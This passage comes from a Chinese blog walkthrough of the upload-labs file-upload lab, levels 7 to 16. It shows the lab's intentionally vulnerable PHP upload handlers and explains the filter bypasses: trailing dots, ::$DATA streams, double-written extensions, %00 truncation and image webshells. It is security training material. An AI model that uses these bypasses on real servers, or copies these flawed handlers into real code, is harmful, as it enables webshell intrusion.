class="string">'.'</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//首尾去空</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>], $UPLOAD_ADDR . <span class="string">'/'</span> . $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>])) &#123;</span><br><span class="line">                $img_path = $UPLOAD_ADDR . <span class="string">'/'</span> . $file_name;</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'此文件不允许上传'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = $UPLOAD_ADDR . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<ul>
<li><strong>去了空格，过滤完美，提示说文件后缀点绕过，就在php后面加个.让他无法解析，就可以绕过了</strong></li>
</ul>
</blockquote>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210723064834702.png" alt="image-20210723064834702"></p>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210723064904118.png" alt="image-20210723064904118"></p>
<h1 id="pass-08"><a href="#pass-08" class="headerlink" title="pass-08"></a>pass-08</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists($UPLOAD_ADDR)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>,<span class="string">".htaccess"</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//首尾去空</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>], $UPLOAD_ADDR . <span class="string">'/'</span> . $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>])) &#123;</span><br><span class="line">                $img_path = $UPLOAD_ADDR . <span class="string">'/'</span> . $file_name;</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'此文件不允许上传'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = $UPLOAD_ADDR . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<ul>
<li><strong>和前面的代码有点不同，没有去掉::$DATA字符流windows文件流绕过</strong></li>
</ul>
</blockquote>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210723065223780.png" alt="image-20210723065223780"></p>
<blockquote>
<ul>
<li><strong>执行的时候不带::$DATA就行了</strong></li>
</ul>
</blockquote>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210723065257088.png" alt="image-20210723065257088"></p>
<h1 id="pass-09"><a href="#pass-09" class="headerlink" title="pass-09"></a>pass-09</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists($UPLOAD_ADDR)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>,<span class="string">".htaccess"</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//首尾去空</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>], $UPLOAD_ADDR . <span class="string">'/'</span> . $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>])) &#123;</span><br><span class="line">                $img_path = $UPLOAD_ADDR . <span class="string">'/'</span> . $file_name;</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'此文件不允许上传'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = $UPLOAD_ADDR . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<ul>
<li><strong>黑名单机制+删除掉文件名最后一个点（若有的话），判断最后一位是不是点，字符串首尾去空。根据代码反向思考构造可以绕过的后缀为.php.空格.</strong></li>
<li><strong>所以用.php.空格.就会删掉后面的点和去空格函数去掉但是还有一个.就形成绕过</strong></li>
</ul>
</blockquote>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210723071200203.png" alt="image-20210723071200203"></p>
<h1 id="pass-10"><a href="#pass-10" class="headerlink" title="pass-10"></a>pass-10</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists($UPLOAD_ADDR)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">"php"</span>,<span class="string">"php5"</span>,<span class="string">"php4"</span>,<span class="string">"php3"</span>,<span class="string">"php2"</span>,<span class="string">"html"</span>,<span class="string">"htm"</span>,<span class="string">"phtml"</span>,<span class="string">"jsp"</span>,<span class="string">"jspa"</span>,<span class="string">"jspx"</span>,<span class="string">"jsw"</span>,<span class="string">"jsv"</span>,<span class="string">"jspf"</span>,<span class="string">"jtml"</span>,<span class="string">"asp"</span>,<span class="string">"aspx"</span>,<span class="string">"asa"</span>,<span class="string">"asax"</span>,<span class="string">"ascx"</span>,<span class="string">"ashx"</span>,<span class="string">"asmx"</span>,<span class="string">"cer"</span>,<span class="string">"swf"</span>,<span class="string">"htaccess"</span>);</span><br><span class="line"></span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = str_ireplace($deny_ext,<span class="string">""</span>, $file_name);</span><br><span class="line">        <span class="keyword">if</span> (move_uploaded_file($_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>], $UPLOAD_ADDR . <span class="string">'/'</span> . $file_name)) &#123;</span><br><span class="line">            $img_path = $UPLOAD_ADDR . <span class="string">'/'</span> .$file_name;</span><br><span class="line">            $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = $UPLOAD_ADDR . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210723071532566.png" alt="image-20210723071532566"></p>
<blockquote>
<ul>
<li><strong>解析：只是单纯的对第一次发现php进行删除，但是构造一个双写php被删了之后还是可以绕过，例如pphphp=php，检测到php就删了但是又构成了一个php</strong></li>
</ul>
</blockquote>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210723071709332.png" alt="image-20210723071709332"></p>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210723071723356.png" alt="image-20210723071723356"></p>
<h1 id="pass-11"><a href="#pass-11" class="headerlink" title="pass-11"></a>pass-11</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    $ext_arr = <span class="keyword">array</span>(<span class="string">'jpg'</span>,<span class="string">'png'</span>,<span class="string">'gif'</span>);</span><br><span class="line">    $file_ext = substr($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>],strrpos($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>],<span class="string">"."</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(in_array($file_ext,$ext_arr))&#123;</span><br><span class="line">        $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">        $img_path = $_GET[<span class="string">'save_path'</span>].<span class="string">"/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$file_ext;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            $msg = <span class="string">'上传失败！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        $msg = <span class="string">"只允许上传.jpg|.png|.gif类型文件！"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<ul>
<li><strong>对文件名进行了随机，提示%00截断</strong></li>
</ul>
</blockquote>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210723072504799.png" alt="image-20210723072504799"></p>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210723072514895.png" alt="image-20210723072514895"></p>
<h1 id="pass-12"><a href="#pass-12" class="headerlink" title="pass-12"></a>pass-12</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    $ext_arr = <span class="keyword">array</span>(<span class="string">'jpg'</span>,<span class="string">'png'</span>,<span class="string">'gif'</span>);</span><br><span class="line">    $file_ext = substr($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>],strrpos($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>],<span class="string">"."</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(in_array($file_ext,$ext_arr))&#123;</span><br><span class="line">        $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">        $img_path = $_POST[<span class="string">'save_path'</span>].<span class="string">"/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$file_ext;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            $msg = <span class="string">"上传失败"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        $msg = <span class="string">"只允许上传.jpg|.png|.gif类型文件！"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210723073123544.png" alt="image-20210723073123544"></p>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210723073233835.png" alt="image-20210723073233835"></p>
<h1 id="pass-13"><a href="#pass-13" class="headerlink" title="pass-13"></a>pass-13</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getReailFileType</span><span class="params">($filename)</span></span>&#123;</span><br><span class="line">    $file = fopen($filename, <span class="string">"rb"</span>);</span><br><span class="line">    $bin = fread($file, <span class="number">2</span>); <span class="comment">//只读2字节</span></span><br><span class="line">    fclose($file);</span><br><span class="line">    $strInfo = @unpack(<span class="string">"C2chars"</span>, $bin);    </span><br><span class="line">    $typeCode = intval($strInfo[<span class="string">'chars1'</span>].$strInfo[<span class="string">'chars2'</span>]);    </span><br><span class="line">    $fileType = <span class="string">''</span>;    </span><br><span class="line">    <span class="keyword">switch</span>($typeCode)&#123;      </span><br><span class="line">        <span class="keyword">case</span> <span class="number">255216</span>:            </span><br><span class="line">            $fileType = <span class="string">'jpg'</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">13780</span>:            </span><br><span class="line">            $fileType = <span class="string">'png'</span>;</span><br><span class="line">            <span class="keyword">break</span>;        </span><br><span class="line">        <span class="keyword">case</span> <span class="number">7173</span>:            </span><br><span class="line">            $fileType = <span class="string">'gif'</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:            </span><br><span class="line">            $fileType = <span class="string">'unknown'</span>;</span><br><span class="line">        &#125;    </span><br><span class="line">        <span class="keyword">return</span> $fileType;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">    $file_type = getReailFileType($temp_file);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>($file_type == <span class="string">'unknown'</span>)&#123;</span><br><span class="line">        $msg = <span class="string">"文件未知，上传失败！"</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $img_path = $UPLOAD_ADDR.<span class="string">"/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$file_type;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            $msg = <span class="string">"上传失败"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<ul>
<li><strong>检查图片前两个字节直接合一个图片马解析漏洞，多试几个图片吧，有的图片过大或者过小里面包含着特殊内容的，都可以pass</strong></li>
</ul>
</blockquote>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210723075037447.png" alt="image-20210723075037447"></p>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210723075210279.png" alt="image-20210723075210279"></p>
<h1 id="pass-14"><a href="#pass-14" class="headerlink" title="pass-14"></a>pass-14</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isImage</span><span class="params">($filename)</span></span>&#123;</span><br><span class="line">    $types = <span class="string">'.jpeg|.png|.gif'</span>;</span><br><span class="line">    <span class="keyword">if</span>(file_exists($filename))&#123;</span><br><span class="line">        $info = getimagesize($filename);</span><br><span class="line">        $ext = image_type_to_extension($info[<span class="number">2</span>]);</span><br><span class="line">        <span class="keyword">if</span>(stripos($types,$ext))&#123;</span><br><span class="line">            <span class="keyword">return</span> $ext;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">    $res = isImage($temp_file);</span><br><span class="line">    <span class="keyword">if</span>(!$res)&#123;</span><br><span class="line">        $msg = <span class="string">"文件未知，上传失败！"</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $img_path = $UPLOAD_ADDR.<span class="string">"/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).$res;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            $msg = <span class="string">"上传失败"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<ul>
<li><strong>只是换了个getimagesize的函数来判断图片类型，但是依旧是nginx的解析漏洞</strong></li>
</ul>
</blockquote>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210723075327660.png" alt="image-20210723075327660"></p>
<h1 id="pass-15"><a href="#pass-15" class="headerlink" title="pass-15"></a>pass-15</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isImage</span><span class="params">($filename)</span></span>&#123;</span><br><span class="line">    <span class="comment">//需要开启php_exif模块</span></span><br><span class="line">    $image_type = exif_imagetype($filename);</span><br><span class="line">    <span class="keyword">switch</span> ($image_type) &#123;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_GIF:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"gif"</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_JPEG:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"jpg"</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_PNG:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"png"</span>;</span><br><span class="line">            <span class="keyword">break</span>;    </span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">    $res = isImage($temp_file);</span><br><span class="line">    <span class="keyword">if</span>(!$res)&#123;</span><br><span class="line">        $msg = <span class="string">"文件未知，上传失败！"</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $img_path = $UPLOAD_ADDR.<span class="string">"/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$res;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            $msg = <span class="string">"上传失败"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<ul>
<li><strong>换了个模块，不影响我们传马，解析</strong></li>
</ul>
</blockquote>
<h1 id="pass-16"><a href="#pass-16" class="headerlink" title="pass-16"></a>pass-16</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    <span class="comment">// 获得上传文件的基本信息，文件名，类型，大小，临时文件路径</span></span><br><span class="line">    $filename = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>];</span><br><span class="line">    $filetype = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'type'</span>];</span><br><span class="line">    $tmpname = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line"></span><br><span class="line">    $target_path=$UPLOAD_ADDR.basename($filename);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获得上传文件的扩展名</span></span><br><span class="line">    $fileext= substr(strrchr($filename,<span class="string">"."</span>),<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//判断文件后缀与类型，合法才进行上传操作</span></span><br><span class="line">    <span class="keyword">if</span>(($fileext == <span class="string">"jpg"</span>) &amp;&amp; ($filetype==<span class="string">"image/jpeg"</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($tmpname,$target_path))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//使用上传的图片生成新的图片</span></span><br><span class="line">            $im = imagecreatefromjpeg($target_path);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>($im == <span class="keyword">false</span>)&#123;</span><br><span class="line">                $msg = <span class="string">"该文件不是jpg格式的图片！"</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">//给新图片指定文件名</span></span><br><span class="line">                srand(time());</span><br><span class="line">                $newfilename = strval(rand()).<span class="string">".jpg"</span>;</span><br><span class="line">                $newimagepath = $UPLOAD_ADDR.$newfilename;</span><br><span class="line">                imagejpeg($im,$newimagepath);</span><br><span class="line">                <span class="comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></span><br><span class="line">                $img_path = $UPLOAD_ADDR.$newfilename;</span><br><span class="line">                unlink($target_path);</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            $msg = <span class="string">"上传失败！"</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(($fileext == <span class="string">"png"</span>) &amp;&amp; ($filetype==<span class="string">"image/png"</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($tmpname,$target_path))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//使用上传的图片生成新的图片</span></span><br><span class="line">            $im = imagecreatefrompng($target_path);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>($im == <span class="keyword">false</span>)&#123;</span><br><span class="line">                $msg = <span class="string">"该文件不是png格式的图片！"</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                 <span class="comment">//给新图片指定文件名</span></span><br><span class="line">                srand(time());</span><br><span class="line">                $newfilename = strval(rand()).<span class="string">".png"</span>;</span><br><span class="line">                $newimagepath = $UPLOAD_ADDR.$newfilename;</span><br><span class="line">                imagepng($im,$newimagepath);</span><br><span class="line">                <span class="comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></span><br><span class="line">                $img_path = $UPLOAD_ADDR.$newfilename;</span><br><span class="line">                unlink($target_path);</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;               </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        